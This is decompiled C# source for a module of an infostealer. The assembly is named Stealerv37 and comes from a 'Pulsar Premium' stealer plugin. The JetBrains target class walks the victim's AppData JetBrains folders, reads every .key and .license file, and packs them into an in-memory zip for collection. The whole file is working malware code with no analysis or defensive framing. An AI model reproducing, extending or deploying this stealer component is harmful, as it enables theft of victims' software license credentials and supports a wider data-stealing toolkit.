// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.JetBrains
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Applications;

public class JetBrains : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), nameof (JetBrains));
    if (!Directory.Exists(path))
      return;
    string[] allowedExtensions = new string[2]
    {
      ".key",
      ".license"
    };
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (JetBrains);
    Parallel.ForEach<string>((IEnumerable<string>) Directory.GetDirectories(path), (Action<string>) (apps => Parallel.ForEach<string>((IEnumerable<string>) Directory.GetFiles(apps), (Action<string>) (file =>
    {
      if (!((IEnumerable<string>) allowedExtensions).Contains<string>(Path.GetExtension(file)))
        return;
      string entryPath = $"JetBrains\\{Path.GetFileName(apps)}\\{Path.GetFileName(file)}";
      zip.AddFile(entryPath, File.ReadAllBytes(file));
      counterApplications.Files.Add($"{file} => {entryPath}");
    }))));
    if (counterApplications.Files.Count<string>() <= 0)
      return;
    counterApplications.Files.Add("JetBrains\\");
    counter.Applications.Add(counterApplications);
  }
}
